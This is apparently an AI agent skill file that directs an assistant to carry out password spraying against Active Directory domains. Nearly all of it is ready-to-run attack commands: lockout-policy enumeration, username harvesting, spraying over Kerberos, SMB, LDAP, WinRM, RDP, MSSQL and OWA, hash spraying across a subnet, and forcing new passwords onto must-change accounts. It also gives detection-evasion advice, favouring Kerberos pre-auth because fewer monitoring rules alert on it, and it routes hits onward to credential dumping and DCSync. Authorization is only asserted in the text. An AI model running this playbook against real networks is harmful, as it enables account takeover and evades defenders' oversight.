---
name: password-spraying
description: >
  Performs password spraying against Active Directory accounts with lockout-safe
  techniques. Use when you have a username list and need to find valid domain
  credentials, or when initial access requires credential guessing. Triggers on:
  "password spray", "spray passwords", "domain spray", "brute force domain",
  "find valid credentials", "lockout policy", "kerbrute spray", "credential
  guessing". OPSEC: high (failed logons generate Event 4625/4771; risk of
  account lockout if policy not respected). Tools: kerbrute, netexec, SpearSpray,
  DomainPasswordSpray, spray.sh.
  Do NOT use for hash-based authentication — use **pass-the-hash** instead.
  Do NOT use for offline hash cracking — use **kerberos-roasting** instead.
---

# Password Spraying

You are helping a penetration tester perform password spraying against an
Active Directory domain. All testing is under explicit written authorization.

**OPSEC Exception**: This skill tests credentials directly against the domain.
The Kerberos-first authentication convention does not apply here — spraying IS
the authentication attempt. However, Kerberos pre-auth spraying (kerbrute,
SpearSpray) is preferred over NTLM spraying because it generates Event 4771
instead of 4625, which is less commonly monitored.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Enumerate policy, build smart password list, spray with
  appropriate delays, report valid credentials. Pause before spraying if
  lockout threshold is dangerously low (<=3).

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [HH:MM] password-spraying -> <domain>` with policy
  details, spray rounds, valid credentials found.
- **Findings** -> Log valid credentials with access level assessment.
- **Evidence** -> Save spray results to `engagement/evidence/spray-results.txt`,
  valid credentials to `engagement/evidence/spray-valid-creds.txt`.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[password-spraying] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] password-spraying → <target>
   - Invoked (assessment starting)
   ```

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check if password policy was already enumerated
- Avoid re-spraying credentials already known
- Use username lists from prior enumeration steps
- Check lockout threshold from prior policy enumeration

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add valid username:password pairs
- **Vulns**: `[found] Valid creds: user1 (Password123)` -> `[done]` if exploited
- **Pivot Map**: Valid creds -> what access they enable
- **Blocked**: Spray attempts that failed, accounts near lockout

## Prerequisites

- Username list (from RID cycling, kerbrute, LDAP, or BloodHound)
- Network access to DC (port 88 for Kerberos, 445 for SMB, 389 for LDAP)
- Tools: `kerbrute`, `netexec` (nxc), optionally `SpearSpray`,
  `DomainPasswordSpray`, `spray.sh`

**WARNING**: Always enumerate password policy before spraying. Spraying without
knowing the lockout threshold risks locking out accounts.

## Step 1: Enumerate Password Policy

### From Linux (Unauthenticated)

```bash
# NetExec — null session or guest
nxc smb DC01.DOMAIN.LOCAL -u '' -p '' --pass-pol
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --pass-pol

# enum4linux
enum4linux -u '' -p '' -P DC01.DOMAIN.LOCAL

# rpcclient
rpcclient -U "" -N DC01.DOMAIN.LOCAL -c "querydominfo"

# LDAP search
ldapsearch -h DC01.DOMAIN.LOCAL -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" \
  | grep -m 1 -B 10 pwdHistoryLength
```

### From Linux (Authenticated)

```bash
# NetExec with valid creds
nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --pass-pol

# With Kerberos
nxc smb DC01.DOMAIN.LOCAL --use-kcache --pass-pol
```

### From Windows

```powershell
# Built-in
net accounts /domain

# PowerView
(Get-DomainPolicy)."SystemAccess"
```

### Key Values to Record

| Policy Setting | What to Record |
|---------------|----------------|
| Lockout threshold | Max failed attempts before lockout (0 = no lockout) |
| Observation window | Time window for counting failures (minutes) |
| Lockout duration | How long accounts stay locked (minutes) |
| Min password length | Informs password list generation |
| Complexity requirements | Whether special chars/numbers are required |
| Password history | Number of previous passwords remembered |

**Critical**: If lockout threshold is 0, there is no lockout — spray freely.
If threshold is low (1-3), extreme caution is needed.

### Fine-Grained Password Policies (PSOs)

Different groups may have different lockout thresholds. SpearSpray handles
this automatically. To check manually:

```bash
# bloodyAD
bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
  get search --filter '(objectClass=msDS-PasswordSettings)' \
  --attr cn,msDS-LockoutThreshold,msDS-LockoutObservationWindow

# PowerView
Get-DomainFineGrainedPasswordPolicy
```

## Step 2: Build Username List

### From Prior Enumeration

If **ad-discovery** already ran, use its username list. Otherwise:

```bash
# RID cycling (unauthenticated)
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --rid-brute 10000 \
  | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt

# kerbrute user enumeration (Kerberos — stealthier, generates 4771)
kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL usernames.txt

# With valid creds — LDAP full user list
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users \
  | awk '{print $5}' > users.txt
```

### Username Wordlists

If no enumeration is possible, use statistically likely usernames:
- https://github.com/insidetrust/statistically-likely-usernames
- Common naming conventions: `first.last`, `flast`, `firstl`, `first_last`

## Step 3: Build Password List

### Smart Patterns (High Success Rate)

```
# Season + Year (most common AD password pattern)
Spring2025!
Summer2025!
Autumn2025!
Winter2025!
Spring2026!

# Company name + number/special
CompanyName1!
CompanyName123
CompanyName2025!

# Month + Year
January2025!
February2026!

# Common defaults
Password1
Password123
Welcome1
Welcome01
P@ssw0rd
P@ssw0rd1
Changeme1!
```

### Generation with maskprocessor

```bash
# Inline generation with NetExec
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p "$(mp64.bin 'Pass@wor?l?a')"
```

### SpearSpray Per-User Patterns

SpearSpray generates passwords per-user based on their account metadata
(pwdLastSet date, username). Patterns include:

```
{name}{separator}{year}{suffix}      # John.2025!
{season_en}{separator}{year}{suffix}  # Spring.2025!
{month_en}{separator}{year}{suffix}   # January.2026!
{samaccountname}{suffix}              # jsmith!
```

## Step 4: Pre-Spray Safety Check

### Check badPwdCount Per User

```bash
# Shows current bad password count for each user
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users
# Output includes badpwdcount column
```

Identify accounts already close to lockout threshold and exclude them from
spray. The builtin **Administrator (RID 500) cannot be locked out** regardless
of policy — always safe to spray.

### Determine Safe Spray Rate

```
safe_attempts = lockout_threshold - 2  # leave buffer
wait_time = observation_window + 1 minute  # wait for counter reset
```

Example: threshold=5, window=30min -> spray 3 passwords, wait 31 minutes.

## Step 5: Spray — Kerberos Pre-Auth (Stealthiest)

Kerberos pre-auth spraying generates Event **4771** (Kerberos pre-authentication
failure) instead of **4625** (logon failure). Many SIEM rules only alert on 4625.

### kerbrute (Recommended)

```bash
# Single password against all users
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  users.txt 'Spring2026!'

# With delay (ms between requests)
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  users.txt 'Spring2026!' --delay 100

# With output file
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  users.txt 'Spring2026!' -v -o spray-round1.log
```

### SpearSpray (PSO-Aware, Most Sophisticated)

```bash
# Basic spray
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL

# Custom LDAP filter (target specific OU or group)
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL \
  -q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Rate-limited with jitter
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL -t 5 -j 3,5 --max-rps 10

# Leave 2 attempts buffer before lockout (default)
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL -thr 2

# LDAPS
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL --ssl

# Mark owned users in BloodHound Neo4j
spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
  -dc DC01.DOMAIN.LOCAL -nu neo4j -np bloodhound \
  --uri bolt://localhost:7687
```

### Rubeus (Windows)

```powershell
# Spray password list against all domain users
.\Rubeus.exe brute /passwords:passwords.txt /outfile:spray-results.txt

# Specific user list
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /outfile:spray-results.txt
```

## Step 6: Spray — NTLM (Fallback)

Use when Kerberos spraying is not viable (e.g., port 88 blocked).
Generates Event **4625** — more commonly monitored.

### NetExec (Multi-Protocol)

```bash
# SMB spray (most common)
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
  --continue-on-success --no-bruteforce -d DOMAIN.LOCAL

# LDAP spray
nxc ldap DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
  --continue-on-success --no-bruteforce

# WinRM spray (if 5985 is open)
nxc winrm DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
  --continue-on-success --no-bruteforce

# RDP spray
nxc rdp DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
  --continue-on-success --no-bruteforce

# MSSQL spray
nxc mssql DB01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
  --continue-on-success --no-bruteforce

# Multiple passwords (spray mode — one password per user, then next password)
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p passwords.txt \
  --continue-on-success --no-bruteforce -d DOMAIN.LOCAL
```

**Critical flags:**
- `--no-bruteforce` — spray mode (one password per user), NOT brute-force
  (all passwords per user). Brute-force mode will lock accounts.
- `--continue-on-success` — don't stop at first valid credential.

### DomainPasswordSpray (Windows, Domain-Joined)

```powershell
# Auto-generates user list from domain, checks policy before spraying
Invoke-DomainPasswordSpray -Password 'Spring2026!'

# With user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2026!'

# Multiple passwords with output
Invoke-DomainPasswordSpray -UserList users.txt -Domain DOMAIN.LOCAL \
  -PasswordList passwords.txt -OutFile spray-results.txt
```

### spray.sh (Lockout-Period Aware)

```bash
# Built-in lockout timing: attempts per period, lockout minutes
spray.sh -smb DC01.DOMAIN.LOCAL users.txt passwords.txt \
  3 30 DOMAIN.LOCAL
# Sprays 3 passwords, waits 30 minutes, repeats
```

### Hash Spray (Lateral Movement)

```bash
# Spray a recovered NTLM hash across subnet
nxc smb 10.10.10.0/24 -u 'Administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \
  --local-auth | grep "Pwn3d"
```

## Step 7: Spray — OWA / Exchange

When Outlook Web Access or Exchange Web Services are exposed.

```bash
# Metasploit OWA
use auxiliary/scanner/http/owa_login
set RHOST mail.domain.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Ruler (Exchange)
ruler-linux64 --domain DOMAIN.LOCAL -k brute \
  --users users.txt --passwords passwords.txt --delay 0 --verbose
```

```powershell
# MailSniper (PowerShell)
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList users.txt \
  -Password 'Spring2026!'

# Invoke-PasswordSprayOWA
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList users.txt \
  -Password 'Spring2026!'
```

## Step 8: Validate and Exploit Hits

### Verify Access Level

```bash
# Check SMB access and admin status
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL
# (Pwn3d!) = local admin

# Check shares
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --shares

# Verify WinRM access
nxc winrm DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL -x "whoami"

# Check RDP access
nxc rdp DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL
```

### Empty Password / Must-Change Technique

Spray empty passwords to find accounts with expired/must-change passwords:

```bash
# Spray empty password
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p '' --continue-on-success

# STATUS_PASSWORD_MUST_CHANGE = expired password
# Change it via SAMR (no old password needed for must-change accounts):
NEWPASS='P@ssw0rd!2025#'
nxc smb DC01.DOMAIN.LOCAL -u 'target_user' -p '' \
  -M change-password -o NEWPASS="$NEWPASS"
```

### Get Domain Password Policy (Post-Auth)

```bash
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --pass-pol
```

## Step 9: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After finding valid credentials:
- **Get a TGT immediately** and switch to Kerberos auth for all future actions:
  ```bash
  getTGT.py DOMAIN/valid_user:'CrackedPass'@DC01.DOMAIN.LOCAL
  export KRB5CCNAME=valid_user.ccache
  ```
- **Local admin on targets**: Route to **credential-dumping** (SAM/LSASS dump),
  then **pass-the-hash** for lateral movement
- **Standard domain user**: Route to **ad-discovery** for full
  authenticated enumeration (BloodHound, ADCS, ACLs)
- **Service account with SPN**: Route to **kerberos-roasting** for related
  accounts
- **High-privilege account**: Route to **credential-dumping** (DCSync)

When routing, pass: valid username/password, domain, DC hostname, current mode.

## Troubleshooting

### Account Lockouts

- **Immediate response**: Stop all spray operations
- **Check**: Re-query password policy — you may have hit a Fine-Grained
  Password Policy with a lower threshold
- **Recovery**: Lockout duration is typically 30 minutes. Wait and resume
  with fewer attempts per round

### KRB_AP_ERR_SKEW (kerbrute)

Clock out of sync. Fix with (requires root — present to user for manual execution):
```bash
sudo ntpdate DC01.DOMAIN.LOCAL
```

### Kerberos Pre-Auth vs NTLM Detection

| Protocol | Detection Event | Commonly Monitored? |
|----------|----------------|---------------------|
| Kerberos pre-auth | 4771 (pre-auth failure) | Less commonly |
| SMB/NTLM | 4625 (logon failure) | Yes, standard SIEM rule |
| LDAP | 4625 (logon failure) | Yes |
| OWA/HTTP | Web server logs | Varies |

Prefer Kerberos pre-auth (kerbrute, SpearSpray) for lowest detection profile.

### No Lockout Threshold (0)

If lockout threshold is 0, there is no lockout protection. You can spray
aggressively, but still prefer Kerberos pre-auth for detection avoidance.

### Valid Creds but ACCESS_DENIED

- Account may be disabled, expired, or restricted to specific workstations
- Check `userAccountControl` flags via LDAP
- Try different protocols (SMB may fail but WinRM may work, or vice versa)
- Try local authentication: `nxc smb TARGET -u user -p pass --local-auth`
